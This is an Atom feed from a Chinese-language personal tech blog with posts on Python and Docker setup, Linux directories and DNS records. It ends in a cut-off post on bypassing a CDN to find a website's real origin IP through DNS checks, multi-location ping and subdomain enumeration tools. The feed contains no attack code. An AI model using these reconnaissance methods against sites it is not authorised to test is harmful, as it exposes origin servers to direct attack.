<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XYTK&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xytk0x0.github.io/"/>
  <updated>2019-12-16T01:32:23.214Z</updated>
  <id>https://xytk0x0.github.io/</id>
  
  <author>
    <name>XYTK</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python2.7安装mysql-python&amp;&amp;CentOS安装python3.7</title>
    <link href="https://xytk0x0.github.io/2019/12/16/python2-7%E5%AE%89%E8%A3%85mysql-python-CentOS%E5%AE%89%E8%A3%85python3-7/"/>
    <id>https://xytk0x0.github.io/2019/12/16/python2-7安装mysql-python-CentOS安装python3-7/</id>
    <published>2019-12-16T01:08:01.000Z</published>
    <updated>2019-12-16T01:32:23.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>整理环境安装的过程</p><h1 id="python2-7-9-安装Mysql-python"><a href="#python2-7-9-安装Mysql-python" class="headerlink" title="python2.7.9 安装Mysql-python"></a>python2.7.9 安装Mysql-python</h1><p>在ubuntu上换了几个环境，网上找到的方法也不太行，就先去Windows10上试一下。</p><h2 id="windows-10"><a href="#windows-10" class="headerlink" title="windows 10"></a>windows 10</h2><p>Windows 10 直接pip也会出错</p><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a> 下载MySQL_python-1.2.5-cp27-none-win_amd64.whl</p><p>将文件放入虚拟环境的Script文件夹中</p><p>pip install MySQL_python-1.2.5-cp27-none-win_amd64.whl</p><h2 id="ubuntu-16-04"><a href="#ubuntu-16-04" class="headerlink" title="ubuntu 16.04"></a>ubuntu 16.04</h2><p>将whl文件下载到虚拟环境文件夹下的/share/python-wheels/中</p><p>执行pip install MySQL_python-1.2.5-cp27-none-win_amd64.whl显示不能安装</p><p>执行pip install MySQL-python 竟然就可以了。。。。</p><h1 id="CentOS安装python3-7-0"><a href="#CentOS安装python3-7-0" class="headerlink" title="CentOS安装python3.7.0"></a>CentOS安装python3.7.0</h1><p>需要在root身份下安装</p><h2 id="安装编译相关工具"><a href="#安装编译相关工具" class="headerlink" title="安装编译相关工具"></a>安装编译相关工具</h2><blockquote><p>yum -y groupinstall “Development tools”<br>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel<br>yum install libffi-devel -y</p></blockquote><h2 id="下载安装包解压"><a href="#下载安装包解压" class="headerlink" title="下载安装包解压"></a>下载安装包解压</h2><blockquote><p>cd #用户目录<br>wget <a href="https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz" target="_blank" rel="noopener">https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz</a><br>tar -xvJf  Python-3.7.0.tar.xz</p></blockquote><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><blockquote><p>mkdir /usr/local/python3 #创建编译安装目录<br>cd Python-3.7.0<br>./configure –prefix=/usr/local/python3<br>make &amp;&amp; make install</p></blockquote><h2 id="创建软连接"><a href="#创建软连接" class="headerlink" title="创建软连接"></a>创建软连接</h2><blockquote><p>ln -s /usr/local/python3/bin/python3 /usr/local/bin/python3<br>ln -s /usr/local/python3/bin/pip3 /usr/local/bin/pip3</p></blockquote><h2 id="验证是否成功"><a href="#验证是否成功" class="headerlink" title="验证是否成功"></a>验证是否成功</h2><blockquote><p>python3 -V<br>pip3 -V</p></blockquote><h2 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h2><p>在pip3 install virtualenv之后，仍然没有virtualenv这个命令</p><p>原因是没有将路径添加到$PATH中</p><blockquote><p>find / -name ‘virtualenv.py’ 找到文件</p></blockquote><blockquote><p>vim /etc/profile</p></blockquote><p>将下面内容添加到文件的最下面</p><blockquote><p>PATH=$PATH:/usr/local/python3/bin</p></blockquote><p>使添加的内容生效</p><blockquote><p>source /etc/profile</p></blockquote><p>最后查看是否添加成功</p><blockquote><p>echo $PATH</p></blockquote><h1 id="相关的一个小问题"><a href="#相关的一个小问题" class="headerlink" title="相关的一个小问题"></a>相关的一个小问题</h1><p>CentOS安装pycharm时遇到的</p><p>下载压缩包解压出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[xytk0x0@localhost Downloads]$ tar -zxvf pycharm-community-2019.3.tar.gz /home/xytk0x0/</span><br><span class="line">tar: /home/xytk0x0: Not found in archive</span><br><span class="line">tar: Exiting with failure status due to previous errors</span><br></pre></td></tr></table></figure><blockquote><p>使用如下命令：<br>tar -zxvf pycharm-community-2019.3.tar.gz -C /home/xytk0x0/</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;整理环境安装的过程&lt;/p&gt;
&lt;h1 id=&quot;python2-7-9-安装Mysql-python&quot;&gt;&lt;a href=&quot;#py
      
    
    </summary>
    
    
      <category term="环境安装或问题解决办法" scheme="https://xytk0x0.github.io/categories/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%88%96%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
      <category term="python" scheme="https://xytk0x0.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://xytk0x0.github.io/tags/python/"/>
    
      <category term="环境安装或问题解决办法" scheme="https://xytk0x0.github.io/tags/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%88%96%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>docker的使用</title>
    <link href="https://xytk0x0.github.io/2019/12/03/docker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://xytk0x0.github.io/2019/12/03/docker的使用/</id>
    <published>2019-12-03T07:43:08.000Z</published>
    <updated>2019-12-05T13:20:55.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>稍微整理一下</p><p>相关链接：</p><p><a href="https://www.w3cschool.cn/docker/" target="_blank" rel="noopener">https://www.w3cschool.cn/docker/</a></p><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><img src="/2019/12/03/docker的使用/14.png" title="xytk0x0"><h2 id="docker架构"><a href="#docker架构" class="headerlink" title="docker架构"></a>docker架构</h2><p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p><p>Docker 容器通过 Docker 镜像来创建。</p><p>容器与镜像的关系类似于面向对象编程中的对象与类。</p><h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>Dockerfile 是用于表示创建一个镜像文件的过程。Dockerfile 是由一个一个的指令组成。</p><h2 id="docker-hub"><a href="#docker-hub" class="headerlink" title="docker hub"></a>docker hub</h2><p>docker hub是docker官方维护的镜像仓库</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Ubantu安装"><a href="#Ubantu安装" class="headerlink" title="Ubantu安装"></a>Ubantu安装</h2><p>要求 Ubuntu 系统的内核版本高于 3.10</p><img src="/2019/12/03/docker的使用/0.png" title="xytk0x0"><blockquote><p>sudo apt-get update<br>安装   sudo apt-get install -y docker.io<br>运行   sudo service docker start</p></blockquote><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><blockquote><p>docker run ubuntu:15.10 /bin/echo “Hello world”</p></blockquote><p><strong>docker:</strong>Docker 的二进制执行文件</p><p><strong>run:</strong>与前面的 docker 组合来运行一个容器</p><p><strong>ubuntu:15.10</strong>指定要运行的镜像，Docker首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像</p><p><strong>/bin/echo “Hello world”:</strong>在启动的容器里执行的命令</p><img src="/2019/12/03/docker的使用/1.png" title="xytk0x0"><h2 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h2><blockquote><p>docker run -i -t ubuntu:15.10 /bin/bash</p></blockquote><p><strong>-t:</strong>在新容器内指定一个伪终端或终端。</p><p><strong>-i:</strong>允许你对容器内的标准输入 (STDIN) 进行交互。</p><img src="/2019/12/03/docker的使用/2.png" title="xytk0x0"><h2 id="后台模式"><a href="#后台模式" class="headerlink" title="后台模式"></a>后台模式</h2><p>以进程的方式运行命令：</p><blockquote><p>docker run -d ubuntu:15.10 /bin/sh -c “while true; do echo hello world; sleep 1; done”</p></blockquote><img src="/2019/12/03/docker的使用/3.png" title="xytk0x0"><img src="/2019/12/03/docker的使用/4.png" title="xytk0x0"><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><img src="/2019/12/03/docker的使用/9.png" title="xytk0x0"><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><p>显示已有镜像</p><img src="/2019/12/03/docker的使用/7.png" title="xytk0x0"><p><strong>REPOSTITORY：</strong>表示镜像的仓库源</p><p><strong>TAG：</strong>镜像的标签</p><p><strong>IMAGE ID：</strong>镜像ID</p><p><strong>CREATED：</strong>镜像创建时间</p><p><strong>SIZE：</strong>镜像大小</p><h2 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h2><blockquote><p>docker ps  查看正在运行的容器<br>docker ps -a   查看所有容器(包括未运行的)</p></blockquote><img src="/2019/12/03/docker的使用/6.png" title="xytk0x0"><h2 id="docker-stop"><a href="#docker-stop" class="headerlink" title="docker stop"></a>docker stop</h2><blockquote><p>docker stop 容器ID/NAMES</p></blockquote><img src="/2019/12/03/docker的使用/5.png" title="xytk0x0"><h2 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h2><p>删除容器需要在停止容器之后</p><blockquote><p>docker rm container ID/names</p></blockquote><img src="/2019/12/03/docker的使用/8.png" title="xytk0x0"><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><p>下载镜像</p><h2 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h2><p>使用dockerfile搭建镜像</p><p>docker build -t 镜像名称 .  # 后面的. 指的是当前文件夹 (其实是Dockerfile存放的文件夹)</p><h2 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h2><p>docker run -it -p 8088:8088 -p 8089:8089 -p 8090:9090 -v /root/soft/docker:/root/soft/docker -v /root/soft/dockertt:/root/soft/dockertt loen/rc /bin/bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">命令的格式：</span><br><span class="line">Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">-a, --attach=[] 登录容器（以docker run -d启动的容器）</span><br><span class="line">-c, --cpu-shares=0 设置容器CPU权重，在CPU共享场景使用</span><br><span class="line">--cap-add=[] 添加权限，权限清单详见：http://linux.die.net/man/7/capabilities</span><br><span class="line">--cap-drop=[] 删除权限，权限清单详见：http://linux.die.net/man/7/capabilities</span><br><span class="line">--cidfile=&quot;&quot; 运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法</span><br><span class="line">--cpuset=&quot;&quot; 设置容器可以使用哪些CPU，此参数可以用来容器独占CPU</span><br><span class="line">-d, --detach=false 指定容器运行于前台还是后台</span><br><span class="line">--device=[] 添加主机设备给容器，相当于设备直通</span><br><span class="line">--dns=[] 指定容器的dns服务器</span><br><span class="line">--dns-search=[] 指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件</span><br><span class="line">-e, --env=[] 指定环境变量，容器中可以使用该环境变量</span><br><span class="line">--entrypoint=&quot;&quot; 覆盖image的入口点</span><br><span class="line">--env-file=[] 指定环境变量文件，文件格式为每行一个环境变量</span><br><span class="line">--expose=[] 指定容器暴露的端口，即修改镜像的暴露端口</span><br><span class="line">-h, --hostname=&quot;&quot; 指定容器的主机名</span><br><span class="line">-i, --interactive=false 打开STDIN，用于控制台交互</span><br><span class="line">--link=[] 指定容器间的关联，使用其他容器的IP、env等信息</span><br><span class="line">--lxc-conf=[] 指定容器的配置文件，只有在指定--exec-driver=lxc时使用</span><br><span class="line">-m, --memory=&quot;&quot; 指定容器的内存上限</span><br><span class="line">--name=&quot;&quot; 指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字</span><br><span class="line">--net=&quot;bridge&quot; 容器网络设置，待详述</span><br><span class="line">-P, --publish-all=false 指定容器暴露的端口，待详述</span><br><span class="line">-p, --publish=[] 指定容器暴露的端口，待详述</span><br><span class="line">--privileged=false 指定容器是否为特权容器，特权容器拥有所有的capabilities</span><br><span class="line">--restart=&quot;&quot; 指定容器停止后的重启策略，待详述</span><br><span class="line">--rm=false 指定容器停止后自动删除容器(不支持以docker run -d启动的容器)</span><br><span class="line">--sig-proxy=true 设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理</span><br><span class="line">-t, --tty=false 分配tty设备，该可以支持终端登录</span><br><span class="line">-u, --user=&quot;&quot; 指定容器的用户</span><br><span class="line">-v, --volume=[] 给容器挂载存储卷，挂载到容器的某个目录</span><br><span class="line">--volumes-from=[] 给容器挂载其他容器上的卷，挂载到容器的某个目录</span><br><span class="line">-w, --workdir=&quot;&quot; 指定容器的工作目录</span><br></pre></td></tr></table></figure><h2 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h2><p>删除镜像</p><h1 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h1><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><img src="/2019/12/03/docker的使用/11.png" title="xytk0x0"><img src="/2019/12/03/docker的使用/10.png" title="xytk0x0"><img src="/2019/12/03/docker的使用/12.png" title="xytk0x0"><blockquote><p>mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf 创建文件夹供挂载</p></blockquote><p>若直接执行<strong>docker run -p 80:80 –name xytk -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</strong>会导致错误。我遇到的原因，本地的~/nginx.conf是文件夹，但docker中的/etc/nginx/nginx.conf是文件，肯定不能进行挂载。</p><blockquote><p>执行顺序：<br>docker run -p 80:80 –name xytk -v $PWD/www:/www  -v $PWD/logs:/wwwlogs  -d nginx<br>docker exec -it mynginx /bin/bash  通过命令行找到docker中的nginx.conf<br>docker cp xytk:/etc/nginx/nginx.conf $PWD/conf/nginx.conf<br>docker stop xytk<br>docker rm xytk<br>docker run -p 80:80 –name xytk -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx<br>使用浏览器判断是否成功安装</p></blockquote><img src="/2019/12/03/docker的使用/13.png" title="xytk0x0"><h1 id="异常及解决办法"><a href="#异常及解决办法" class="headerlink" title="异常及解决办法"></a>异常及解决办法</h1><h2 id="下载速度慢"><a href="#下载速度慢" class="headerlink" title="下载速度慢"></a>下载速度慢</h2><p>在/etc/docker中创建daemon.json文件，将以下语句写入并重启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;registry-mirrors&quot; : [&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>国内的下载源：</p><blockquote><p>中科大：<a href="https://docker.mirrors.ustc.edu.cn" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn</a></p></blockquote><h2 id="docker-Got-permission-denied"><a href="#docker-Got-permission-denied" class="headerlink" title="docker: Got permission denied"></a>docker: Got permission denied</h2><img src="/2019/12/03/docker的使用/error0.png" title="xytk0x0"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The docker daemon binds to a Unix socket instead of a TCP port. By default that Unix socket is owned by the user root and other users can only access it using sudo. The docker daemon always runs as the root user.</span><br><span class="line">If you don’t want to use sudo when you use the docker command, create a Unix group called docker and add users to it. When the docker daemon starts, it makes the ownership of the Unix socket read/writable by the docker group.</span><br></pre></td></tr></table></figure><p>解决办法：</p><p>1、使用root权限执行命令。sudo + 命令</p><p>2、使用docker用户组中的数据</p><blockquote><p>sudo groupadd docker  应该会默认新建这个用户组<br>sudo gpasswd -a 用户名 用户组名<br>sudo newgrp 用户组名<br>docker ps 查看问题是否解决</p></blockquote><img src="/2019/12/03/docker的使用/error1.png" title="xytk0x0">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;稍微整理一下&lt;/p&gt;
&lt;p&gt;相关链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.w3cschool.cn/d
      
    
    </summary>
    
    
      <category term="docker" scheme="https://xytk0x0.github.io/categories/docker/"/>
    
    
      <category term="docker" scheme="https://xytk0x0.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Linux根目录结构</title>
    <link href="https://xytk0x0.github.io/2019/11/18/Linux%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/"/>
    <id>https://xytk0x0.github.io/2019/11/18/Linux根目录结构/</id>
    <published>2019-11-18T01:52:05.000Z</published>
    <updated>2019-11-18T05:57:19.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前看过《鸟哥的Linux私房菜》这本书的大部分，但这些东西不常用就忘得差不多了，以后把用到的稍微整理一下。</p><h1 id="Linux根目录结构"><a href="#Linux根目录结构" class="headerlink" title="Linux根目录结构"></a>Linux根目录结构</h1><p>centos 7:</p><img src="/2019/11/18/Linux根目录结构/0.png" title="XYTK"><h2 id="bin目录"><a href="#bin目录" class="headerlink" title="bin目录"></a>bin目录</h2><p>此目录存放所有二进制命令（用户）</p><h2 id="boot目录"><a href="#boot目录" class="headerlink" title="boot目录"></a>boot目录</h2><p>Linux内核及引导系统程序所需的目录</p><h2 id="dev目录"><a href="#dev目录" class="headerlink" title="dev目录"></a>dev目录</h2><p>所有设备文件的目录（如声卡、磁盘、光驱）</p><h2 id="etc目录"><a href="#etc目录" class="headerlink" title="etc目录"></a>etc目录</h2><p>二进制安装包（yum，rpm）配置文件默认路径，服务启动命令存放目录</p><h2 id="home目录"><a href="#home目录" class="headerlink" title="home目录"></a>home目录</h2><p>普通用户的家目录默认数据存放目录</p><h2 id="lib、lib64目录"><a href="#lib、lib64目录" class="headerlink" title="lib、lib64目录"></a>lib、lib64目录</h2><p>库文件存放目录</p><h2 id="media"><a href="#media" class="headerlink" title="media"></a>media</h2><p>挂载可移动介质(media)，诸如CD、数码相机等用于挂载可移动设备的临时目录</p><h2 id="mnt目录"><a href="#mnt目录" class="headerlink" title="mnt目录"></a>mnt目录</h2><p>用于临时挂载存储设备</p><p>通常情况下可以挂载LINUX ISO光盘进行无网条件下的安装其他软件包</p><h2 id="opt目录"><a href="#opt目录" class="headerlink" title="opt目录"></a>opt目录</h2><p>自定义软件安装存放目录，用户自行安装的软件包存放目录。</p><h2 id="proc目录"><a href="#proc目录" class="headerlink" title="proc目录"></a>proc目录</h2><p>进程及内核信息存放目录</p><h2 id="root目录"><a href="#root目录" class="headerlink" title="root目录"></a>root目录</h2><p>root身份目录</p><h2 id="sbin目录"><a href="#sbin目录" class="headerlink" title="sbin目录"></a>sbin目录</h2><p>系统管理员命令存放的目录（超级管理员使用的命令）</p><h2 id="tmp目录"><a href="#tmp目录" class="headerlink" title="tmp目录"></a>tmp目录</h2><p>临时文件目录，程序运行时产生的临时文件存放目录</p><h2 id="usr目录"><a href="#usr目录" class="headerlink" title="usr目录"></a>usr目录</h2><p>系统存放程序的目录（命令和帮助文件）</p><p>其中usr/bin 用户可执行文件目录（应用程序）</p><p>/usr/sbin目录　　存放一些网络管理工具的软件目录</p><h2 id="var目录"><a href="#var目录" class="headerlink" title="var目录"></a>var目录</h2><p>存放内容常变动的文件目录</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前看过《鸟哥的Linux私房菜》这本书的大部分，但这些东西不常用就忘得差不多了，以后把用到的稍微整理一下。&lt;/p&gt;
&lt;h1 id=&quot;Lin
      
    
    </summary>
    
    
      <category term="linux" scheme="https://xytk0x0.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://xytk0x0.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>域名解析的记录类型</title>
    <link href="https://xytk0x0.github.io/2019/11/17/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%9A%84%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B/"/>
    <id>https://xytk0x0.github.io/2019/11/17/域名解析的记录类型/</id>
    <published>2019-11-17T07:54:40.000Z</published>
    <updated>2019-11-17T09:05:08.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>用户将域名提供给浏览器，通过域名解析能够找到对应的IP地址，通过IP地址找到服务器并返回资源。当然，在现在的复杂网络中，步骤要比这多得多。</p><p>域名解析指从域名到IP的解析过程。解析工作由DNS服务器完成。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>A记录、CNAME、MX记录、NS记录</p><h1 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h1><p>是最普通常见的域名解析，是把某一主机名解析到服务器IP。</p><p>AAAA：用来指定主机名（或域名）对应的IPv6地址。A记录对应的是IPV4地址。</p><h1 id="CNAME"><a href="#CNAME" class="headerlink" title="CNAME"></a>CNAME</h1><p>是主机名到主机名的映射，是把某一主机名解析到另一主机名。将空主机解析到别名aaaaa.com，访问该空主机的域名就会访问别名所解析到的IP。</p><h1 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h1><p>如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。主要是用于做企业邮箱使用。</p><p>邮件交换记录。用于将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理。如：用户所用的邮件是以域名mydomain.com为结尾的，则需要在管理界面中添加该域名的MX记录来处理所有以@mydomain.com结尾的邮件。</p><h1 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a>NS记录</h1><p>域名服务器记录，如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录。比如自己搭建DNS服务器的话也需要做NS记录将主机指向服务器。</p><p>解析服务器记录。用来表明由哪台服务器对该域名进行解析。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;域名解析&quot;&gt;&lt;a href=&quot;#域名解析&quot; class=&quot;headerlink&quot; title=&quot;域名解析&quot;&gt;&lt;/a&gt;域名解析&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h
      
    
    </summary>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>绕过CDN的方法</title>
    <link href="https://xytk0x0.github.io/2019/11/13/%E7%BB%95%E8%BF%87CDN%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://xytk0x0.github.io/2019/11/13/绕过CDN的方法/</id>
    <published>2019-11-13T09:09:12.000Z</published>
    <updated>2019-11-17T07:21:28.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相关链接： </p><p><a href="https://www.jianshu.com/p/ce98fbff39ac" target="_blank" rel="noopener">https://www.jianshu.com/p/ce98fbff39ac</a></p><p><a href="https://zhuanlan.zhihu.com/p/33440472" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33440472</a></p><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>CDN 全称是Content Delivery Network，即内容分发网络。</p><p>CDN是一组分布在多个不同的地理位置的WEB服务器，用于更加有效的向用户发布内容，在优化性能时，会根据距离的远近来选择。</p><p>CDN系统能实时的根据网络流量和各节点的连接，负载状况及用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，其目的是使用户能就近的获取请求数据，解决网络拥堵，提高访问速度，解决由于网络带宽小，用户访问量大，网点分布不均等原因导致的访问速度慢的问题。</p><p>由于CDN部署在网络运营商的机房，这些运营商又是终端用户网络的提供商，因此用户请求的第一跳就到达CDN服务器，当CDN服务器中缓存有用户请求的数据时，就可以从CDN直接返回给浏览器，因此就可以提高访问速度。</p><p>CDN能够缓存JavaScript脚本，css样式表，图片，图标，Flash等静态资源文件（不包括html页面），这些静态资源文件的访问频率很高，将其缓存在CDN可以极大地提高网站的访问速度，但由于CDN是部署在网络运营商的机房，所以在一般的网站很少用CDN加速。</p><h2 id="分发的原理"><a href="#分发的原理" class="headerlink" title="分发的原理"></a>分发的原理</h2><p>用户向浏览器提供需要访问的域名；</p><p>浏览器调用域名解析库对域名进行解析，由于CDN对域名解析过程进行了调整，所以解析函数库一般得到的是该域名对应的CNAME记录，为了得到实际的IP地址，浏览器需要再次对获得的CNAME域名进行解析以得到实际的IP地址；在此过程中，使用的全局负载均衡DNS解析。如根据地理位置信息解析对应的IP地址，使得用户能就近访问；</p><p>此次解析得到CDN缓存服务器的IP地址，浏览器在得到实际的ip地址之后，向缓存服务器发出访问请求；</p><p>缓存服务器根据浏览器提供的要访问的域名，通过Cache内部专用DNS解析得到此域名的实际IP地址，再由缓存服务器向此实际IP地址提交访问请求；</p><p>缓存服务器从实际IP地址得到内容以后，一方面在本地进行保存，以备以后使用，二方面把获取的数据放回给客户端，完成数据服务过程；</p><p>客户端得到由缓存服务器返回的数据以后显示出来并完成整个浏览的数据请求过程。</p><h1 id="绕过CDN的方法"><a href="#绕过CDN的方法" class="headerlink" title="绕过CDN的方法"></a>绕过CDN的方法</h1><p><strong>绕过CDN的目的：找到网站的真实IP地址</strong></p><h2 id="判断IP是否为真实IP"><a href="#判断IP是否为真实IP" class="headerlink" title="判断IP是否为真实IP"></a>判断IP是否为真实IP</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>若域名解析结果为多个IP，则很有可能使用了CDN</p><h3 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h3><p>使用不同区域ping，查看ping的ip结果是否唯一。</p><blockquote><p>网站有：<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a></p></blockquote><h3 id="使用工具直接查询"><a href="#使用工具直接查询" class="headerlink" title="使用工具直接查询"></a>使用工具直接查询</h3><blockquote><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a><br><a href="https://www.cdnplanet.com/tools/cdnfinder/" target="_blank" rel="noopener">https://www.cdnplanet.com/tools/cdnfinder/</a></p></blockquote><h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>某些企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用。查询子域名的方法就很多了：subDomainsBrute、Sublist3r、Google hack等。</p><blockquote><p>使用网站查询：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" 